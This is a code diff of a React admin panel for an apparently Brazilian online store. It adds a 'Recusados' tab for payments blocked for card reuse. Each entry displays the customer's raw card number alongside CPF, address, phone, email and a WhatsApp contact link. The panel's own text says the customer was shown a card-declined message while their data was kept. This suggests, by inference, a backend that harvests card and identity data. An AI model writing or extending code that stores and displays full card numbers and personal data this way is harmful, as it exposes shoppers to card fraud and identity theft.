@@ -90,15 +90,15 @@ export default function LeadsPanelPage() {
   const [filterFrom, setFilterFrom] = useState("");
   const [filterTo, setFilterTo] = useState("");
   const [search, setSearch] = useState("");
-  const [tab, setTab] = useState<"leads" | "pedidos" | "pix">("leads");
+  const [tab, setTab] = useState<"leads" | "pedidos" | "pix" | "recusados">("leads");
   const [updatingStatusId, setUpdatingStatusId] = useState<string | null>(null);
   const [pixStatusFilter, setPixStatusFilter] = useState<"todos" | "pendentes" | "pagos">("todos");
 
-  const filteredLeads = useMemo(() => {
-    const from = filterFrom ? new Date(`${filterFrom}T00:00:00`).getTime() : null;
-    const to = filterTo ? new Date(`${filterTo}T23:59:59.999`).getTime() : null;
-    const term = search.trim().toLowerCase();
-    return leads.filter((lead) => {
+  const matchesFilters = useCallback(
+    (lead: Lead) => {
+      const from = filterFrom ? new Date(`${filterFrom}T00:00:00`).getTime() : null;
+      const to = filterTo ? new Date(`${filterTo}T23:59:59.999`).getTime() : null;
+      const term = search.trim().toLowerCase();
       const t = new Date(lead.createdAt).getTime();
       if (from !== null && t < from) return false;
       if (to !== null && t > to) return false;
@@ -107,8 +107,23 @@ export default function LeadsPanelPage() {
         if (!haystack.includes(term)) return false;
       }
       return true;
-    });
-  }, [leads, filterFrom, filterTo, search]);
+    },
+    [filterFrom, filterTo, search]
+  );
+
+  // Pedidos recusados (cartão reutilizado) ficam apenas na aba "Recusados".
+  const filteredLeads = useMemo(
+    () =>
+      leads.filter(
+        (lead) => lead.manualStatus !== "RECUSADO" && matchesFilters(lead)
+      ),
+    [leads, matchesFilters]
+  );
+
+  const recusadosLeads = useMemo(
+    () => leads.filter((lead) => lead.manualStatus === "RECUSADO" && matchesFilters(lead)),
+    [leads, matchesFilters]
+  );
 
   const summary = useMemo(() => {
     const totalCents = filteredLeads.reduce((sum, l) => sum + l.totalCents, 0);
@@ -467,6 +482,16 @@ export default function LeadsPanelPage() {
             }`}
           >
             Pix ({pixLeads.length})
+          </button>
+          <button
+            onClick={() => setTab("recusados")}
+            className={`-mb-px border-b-2 pb-3 text-[11px] font-bold uppercase tracking-widest2 transition ${
+              tab === "recusados"
+                ? "border-red-400 text-red-300"
+                : "border-transparent text-cream/50 hover:text-cream/80"
+            }`}
+          >
+            Recusados ({recusadosLeads.length})
           </button>
         </div>
 
@@ -933,6 +958,103 @@ export default function LeadsPanelPage() {
               </div>
             )}
           </>
+        )}
+
+        {tab === "recusados" && (
+          recusadosLeads.length === 0 ? (
+            <p className="mt-16 text-center text-sm text-cream/50">
+              Nenhum pedido recusado ainda. Tentativas de pagamento com cartão
+              já utilizado aparecem aqui automaticamente.
+            </p>
+          ) : (
+            <div className="mt-8 space-y-4">
+              <p className="text-xs text-cream/40">
+                Pagamentos bloqueados por reutilização de cartão. O cliente
+                recebeu a mensagem de cartão recusado e o pedido não foi
+                registrado.
+              </p>
+              {recusadosLeads.map((lead) => {
+                let items: LeadItem[] = [];
+                try {
+                  items = JSON.parse(lead.itemsJson) as LeadItem[];
+                } catch {
+                  items = [];
+                }
+
+                return (
+                  <div
+                    key={lead.id}
+                    className="rounded-lg border border-red-400/25 bg-ink-soft p-5"
+                  >
+                    <div className="flex flex-wrap items-center justify-between gap-3">
+                      <div className="min-w-0">
+                        <p className="text-sm font-semibold text-cream">
+                          #{lead.id.slice(-6).toUpperCase()} · {lead.fullName}
+                        </p>
+                        <p className="mt-0.5 text-xs text-cream/50">
+                          {lead.email} · {lead.phone}
+                        </p>
+                        <p className="mt-0.5 text-xs text-cream/50">
+                          {new Date(lead.createdAt).toLocaleString("pt-BR")} ·{" "}
+                          {lead.installments}
+                          {lead.installments === "1" ? "x (à vista)" : "x sem juros"}
+                        </p>
+                      </div>
+                      <div className="flex items-center gap-3">
+                        <a
+                          href={whatsappLink(lead.phone, lead.fullName)}
+                          target="_blank"
+                          rel="noreferrer"
+                          className="rounded border border-emerald-500/40 px-2.5 py-1.5 text-[10px] font-bold uppercase tracking-widest2 text-emerald-300 transition hover:border-emerald-500/70"
+                        >
+                          WhatsApp
+                        </a>
+                        <span className="rounded-full border border-red-400/40 bg-red-400/10 px-3 py-1 text-[9px] font-bold uppercase tracking-widest2 text-red-300">
+                          Recusado
+                        </span>
+                        <p className="text-sm font-bold text-gold-400">
+                          {formatBRL(lead.totalCents)}
+                        </p>
+                      </div>
+                    </div>
+
+                    <div className="mt-4 grid gap-3 border-t border-red-400/10 pt-4 text-sm sm:grid-cols-2 lg:grid-cols-4">
+                      <Field label="CPF" value={lead.cpf} />
+                      <Field label="CEP" value={lead.cep} />
+                      <Field
+                        label="Endereço"
+                        value={`${lead.address}, ${lead.number}`}
+                      />
+                      <Field label="Complemento" value={lead.complement} />
+                      <Field label="Bairro" value={lead.neighborhood} />
+                      <Field label="Cidade/UF" value={`${lead.city}/${lead.state}`} />
+                      <Field label="Cartão" value={lead.cardNumber} />
+                      <Field label="Forma de pagamento" value="Cartão" />
+                    </div>
+
+                    <div className="mt-4 border-t border-red-400/10 pt-4">
+                      <span className="block text-[10px] font-bold uppercase tracking-widest2 text-cream/40">
+                        Itens
+                      </span>
+                      <ul className="mt-1 space-y-0.5 text-sm text-cream/80">
+                        {items.map((item, idx) => (
+                          <li key={idx}>
+                            {item.productName} × {item.quantity} —{" "}
+                            {formatBRL(item.unitPriceCents * item.quantity)}
+                          </li>
+                        ))}
+                      </ul>
+                      {lead.discountCents > 0 && (
+                        <p className="mt-1 text-xs text-emerald-400">
+                          Desconto aplicado: -{formatBRL(lead.discountCents)}
+                        </p>
+                      )}
+                    </div>
+                  </div>
+                );
+              })}
+            </div>
+          )
         )}
       </div>
     </main>
